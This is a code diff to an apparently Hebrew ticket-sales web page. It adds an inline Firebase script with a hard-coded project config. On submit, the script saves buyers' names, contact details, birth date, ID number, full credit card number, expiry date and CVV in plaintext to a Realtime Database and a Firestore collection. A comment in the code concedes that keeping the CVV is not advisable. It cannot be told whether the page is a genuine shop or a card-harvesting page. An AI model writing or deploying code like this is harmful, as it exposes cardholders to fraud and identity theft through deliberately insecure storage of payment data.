@@ -1087,6 +1087,124 @@
   </script>
 
   <!-- firebase.js (UNCHANGED) -->
-  <script src="firebase.js" defer></script>
+  <script>
+  // מעבר למסך מסוים
+  function goToScreen(n) {
+    document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
+    const target = document.getElementById(`screen${n}`);
+    if (target) target.classList.add("active");
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  }
+
+  document.addEventListener("DOMContentLoaded", function () {
+    const firebaseConfig = {
+      apiKey: "AIzaSyDZVrncvPwEg6IDHjloweJNjrpj32lZy5g",
+      authDomain: "zygo-acf32.firebaseapp.com",
+      databaseURL: "https://zygo-acf32-default-rtdb.europe-west1.firebasedatabase.app",
+      projectId: "zygo-acf32",
+      storageBucket: "zygo-acf32.firebasestorage.app",
+      messagingSenderId: "243652763597",
+      appId: "1:243652763597:web:f9cbc63435193855236e84"
+    };
+
+    // אתחול בטוח
+    if (!firebase.apps.length) {
+      firebase.initializeApp(firebaseConfig);
+      console.log("Firebase initialized");
+    } else {
+      console.log("Firebase already initialized");
+    }
+
+    const database = firebase.database();
+    const firestore = firebase.firestore();
+
+    const form = document.getElementById("nameForm");
+    const statusEl = document.getElementById("saveStatus");
+    const payBtn = document.getElementById("payBtn");
+
+    if (!form) {
+      console.error("Form #nameForm not found");
+      return;
+    }
+
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault();
+
+      // אם יש לך ולידציה חיצונית - תן לה לרוץ (אם היא חסמה submit לא נגיע לכאן בכלל)
+      // כאן זה כבר submit אמיתי => ננסה לשמור
+
+      const os = window.orderState || {
+        regularQty: 1,
+        vipQty: 0,
+        regularUnit: 220,
+        vipUnit: 320
+      };
+
+      const totalQty = (Number(os.regularQty) || 0) + (Number(os.vipQty) || 0);
+      const totalAmount =
+        (Number(os.regularQty) || 0) * (Number(os.regularUnit) || 0) +
+        (Number(os.vipQty) || 0) * (Number(os.vipUnit) || 0);
+
+      const userData = {
+        firstName: (document.getElementById("firstName")?.value || ""),
+        lastName: (document.getElementById("lastName")?.value || ""),
+        email: (document.getElementById("email")?.value || ""),
+        phoneNumber: (document.getElementById("phoneNumber")?.value || ""),
+        birthDate: (document.getElementById("birthDate")?.value || ""),
+        gender: (document.getElementById("gender")?.value || ""),
+        instagram: (document.getElementById("instagram")?.value || ""),
+        ID: (document.getElementById("ID")?.value || ""),
+
+        tickets: {
+          regularQty: Number(os.regularQty) || 0,
+          vipQty: Number(os.vipQty) || 0,
+          regularUnit: Number(os.regularUnit) || 0,
+          vipUnit: Number(os.vipUnit) || 0
+        },
+        totalQty,
+        totalAmount,
+
+        // שימו לב: לא מומלץ לשמור CVV בפרודקשן
+        creditCardNumber: (document.getElementById("creditCardNumber")?.value || ""),
+        expire: (document.getElementById("expire")?.value || ""),
+        cvv: (document.getElementById("cvv")?.value || ""),
+
+        createdAt: Date.now()
+      };
+
+      try {
+        if (statusEl) statusEl.textContent = "שומר נתונים...";
+
+        // שמירה ל-RTDB
+        const rtdbRes = await database.ref("Details").push(userData);
+
+        // שמירה ל-Firestore
+        const fsRes = await firestore.collection("Details").add(userData);
+
+        console.log("Saved RTDB key:", rtdbRes.key);
+        console.log("Saved Firestore id:", fsRes.id);
+
+        if (statusEl) statusEl.textContent = "✅ נשמר בהצלחה";
+
+        // ✅ מעבר למסך הצלחה בלי להסתמך על alert
+        goToScreen(4);
+
+        // אופציונלי: לאפס טופס אחרי שעברתם למסך 4 (את יכולה למחוק אם לא רוצה)
+        // form.reset();
+
+      } catch (error) {
+        console.error("Firebase save error:", error);
+        if (statusEl) statusEl.textContent = "❌ שמירה נכשלה (בדוק Console)";
+        alert("❌ השמירה נכשלה (בדוק Console)");
+      }
+    });
+
+    // עוזר לראות אם הדפדפן חוסם בגלל required (לא קשור לפיירבייס)
+    if (payBtn) {
+      payBtn.addEventListener("click", () => form.reportValidity());
+    }
+  });
+</script>
+
 </body>
 </html>
